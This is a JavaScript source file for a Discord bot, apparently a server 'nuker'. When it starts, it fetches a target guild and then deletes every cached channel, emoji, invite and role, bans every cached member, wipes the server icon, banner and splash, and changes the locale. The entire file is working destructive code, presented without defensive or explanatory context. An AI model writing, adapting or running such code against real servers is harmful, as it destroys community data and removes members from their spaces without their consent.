require("dotenv").config();
const {
    Client,
    Locale,
    Events,
    GatewayIntentBits: {
        Guilds,
        GuildMessages,
        GuildMembers,
        MessageContent,
        GuildIntegrations,
    },
} = require("discord.js");
const options = {
    intents: [
        Guilds,
        GuildMessages,
        MessageContent,
        GuildMembers,
        GuildIntegrations,
    ],
};
const client = new Client(options);
client.on(Events.ClientReady, async () => {
    console.log("fetch guild...");
    client.guilds.fetch(process.env.guildid).then(async (guild) => {
        console.log("nuke!");
        guild.channels.cache.map((channel) => {
            console.log("delete channel:  " + channel.id);
            channel.delete().catch((e) => console.log(`channel: ${e}`));
        });
        guild.members.cache.map((member) => {
            console.log("ban member:  " + member.id);
            member.ban().catch((e) => console.log(`member: ${e}`));
        });
        guild.emojis.cache.map((emoji) => {
            console.log("delete emoji:  " + emoji.id);
            emoji.delete().catch((e) => console.log(`emoji: ${e}`));
        });
        guild.invites.cache.map((invite) => {
            console.log("delete invite:  " + invite.code);
            invite.delete().catch((e) => console.log(`invite: ${e}`));
        });
        guild.roles.cache.map((role) => {
            console.log("delete role:  " + role.id);
            role.delete().catch((e) => console.log(`role: ${e}`));
        });
        guild.setIcon(null).catch((e) => console.log(`icon: ${e}`));
        guild
            .setDefaultMessageNotifications(null)
            .catch((e) => console.log(`DefaultNotif: ${e}`));
        guild.setBanner(null).catch((e) => console.log(`Banner: ${e}`));
        guild
            .setDiscoverySplash(null)
            .catch((e) => console.log(`DiscoverySplash: ${e}`));
        guild
            .setPreferredLocale(Locale.Russian)
            .catch((e) => console.log(`Locate: ${e}`));
    });
});
client.on("error", () => {
    console.log("error");
});
client.login(process.env.token);
